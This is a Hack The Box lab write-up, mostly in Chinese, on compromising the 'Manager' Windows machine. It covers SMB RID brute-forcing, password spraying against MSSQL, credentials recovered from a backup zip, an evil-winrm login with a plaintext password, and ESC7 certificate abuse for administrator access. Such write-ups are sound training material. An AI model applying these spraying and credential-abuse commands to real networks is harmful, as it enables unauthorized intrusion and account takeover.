Hack The Box Write-up Manager
=============

# Scanning
    sudo nmap -sC -sV -O 10.10.11.236
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/27d8dc37-94da-42ea-9236-6a60b7cc92e0)
To initiate user enumeration, we employ the Crackmapexec program for brute-force attacks

***
## Enumeration
    crackmapexec smb 10.10.11.236 -u anonymous -p "" --rid-brute 10000

![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/729f254e-62fc-42a9-9a39-24f4ce4ed472)


透過暴力破解過程取得用戶憑證
-   zhong
-   cheng
-   ryan
-   ravan
-   jinwoo
-   chinhae
-   operator

一旦我們有了用戶列表，接下來就可以進行password spraying。
一樣使用Crackmapexec 來完成此任務。

    crackmapexec mssql manager.htb -u /home/kali/Desktop/user.txt -p /home/kali/Desktop/user.txt


![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/bb1b5685-56eb-4863-b86d-34e54dce67b0)

在此步驟中，我們觀察到運營商的使用者可以使用 MSSQL 進行身份驗證。我們與它建立連接，利用指定的命令來檢查裡面是否有任何資料或資訊。
我們發現operator可以進去
故我們透過此進去。

    impacket-mssqlclient -port 1433 10.10.11.236/operator:operator@10.10.11.236 -window 
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/1a1fa680-4d8d-4f9c-94f7-22716c248ede)

發現沒有甚麼資訊，我就更深入去研究

[這是我查詢的連結](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server?source=post_page-----c56f238991c0--------------------------------)

![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/8175bdb9-9c8c-45dc-a091-9fddd6263021)

看到用藍色字標起來的檔案很可疑 把它下載起來

    wget 10.10.11.236/website-backup-27-07-23-old.zip
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/b911ad94-53fb-4269-aafc-cc295549e195)


### 打開可疑介面，發現用戶帳號密碼
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/35c851e5-2793-404b-adef-0dd0f52a01fd)

我們將zip打開，看到用戶raven的帳號及密碼。


### 利用Evil-winrm使用指定的命令建立連接，成功取得了User flag
    evil-winrm -i 10.10.11.236 -u raven -p 'R4v3nBe5tD3veloP3r!123'
    
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/97ef99a2-867c-4cd4-a407-9f92b02f23a7)


#### FLAG
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/be790095-3c18-4660-8b2e-13c9a3992109)


# 權限提升
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/69e5b5a8-bdb2-40e9-aff8-b6edcb3c7bcb)


觀察到 SeMachineAccountPrivilege 已啟用，並且可用於搜尋和發現漏洞的選項有限。為了繼續，我們使用指定的命令將 Certify.exe 上傳到電腦。
此檔案利用以下連結的程式    
[certify.exe](https://github.com/depradip/Ghostpack_CompiledBinaries/tree/main)

![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/6e75f1b8-9fab-4dca-8632-f4e51859c6d8)


接下來在他那邊執行程式

    ./Certify.exe find /vulnarable
    
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/4337adcb-33a0-4233-953f-8dd3ec1fcdeb)


發現SubCA，故我們使用Hacktrick裡面的技巧
但是我一直無法使用certipy
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/06cc6953-ae2b-4c15-bbd7-56a9f2f042bf)

如果可以用的話，會呈現這樣的資訊
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/37963fa7-c13a-40b0-a61a-28abe9f76549)

然後看到Vulnerabilities發現是ESC7
從[此連結](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation?source=post_page-----c56f238991c0--------------------------------)教學如何解
然後會取得憑證
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/adf46b2d-f57e-4c97-9e0a-3c17df92e8f5)

取得administrator的帳密
在進入帳號，照像之前的步驟拿到root.txt 取得flag.
![image](https://github.com/TwMoonBear-Arsenal/Pub-ClassWork/assets/144238459/bc2a517c-9b11-429c-858d-a6c774ef074c)
